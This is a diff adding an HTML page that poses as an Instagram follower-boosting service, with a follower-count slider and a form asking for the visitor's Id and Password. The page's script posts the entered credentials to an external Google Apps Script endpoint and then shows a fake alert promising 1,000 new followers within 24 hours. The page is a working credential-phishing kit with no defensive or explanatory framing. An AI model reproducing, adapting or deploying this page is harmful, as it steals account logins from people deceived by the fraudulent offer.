@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./style3.css">
+    <title>INCRESING FOLLOWER</title>
+</head>
+<body>
+
+    <div class="font">
+        <a href="./index.html" class="h">HOME</a>
+    </div>
+
+
+
+<div class="lol">
+    <span id="rangeValue">0</span>
+    <input class="range" type="range" name="" value="0" min="0" max="1000" onchange="rangeSlide(this.value)" onmousemove="rangeSlide(this.value)">
+</div>
+
+<div class="head">
+<h1 class="heading">Followers</h1>
+</div><br>
+
+
+
+
+<div class="math">
+    <img src="./img/instagram.png" class="img1">
+    <form method="post" name="google-sheet">
+      <input type="text" name="Id" placeholder="your Id" class="box"><br>
+      <input type="text" name="Password" placeholder="your Password" class="box"><br>
+      <input type="submit" value="submit" class="iphone">
+    </form>
+  </div><br>
+ <!-- ---------------------- java script ---------------------- -->
+ <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyv-XOy6hwX1X2ahkfcrUg3-FUZ536uNcVwW3pBt67tmmStgMG19k8vXsJX6sBZG0H9Mg/exec'
+    const form = document.forms['google-sheet']
+  
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => alert("congratulation Your  1k Followers are increase in 24 hr..."))
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+  <!-- ---------------------- java script End ---------------------- -->
+ 
+
+
+<!-- ################### javascript ######################### -->
+    <script type="text/javascript">
+     function rangeSlide(value){
+        document.getElementById('rangeValue').innerHTML = value;
+     }
+    </script>
+
+    <!-- ################### javascript End ######################### -->
+</body>
+</html>
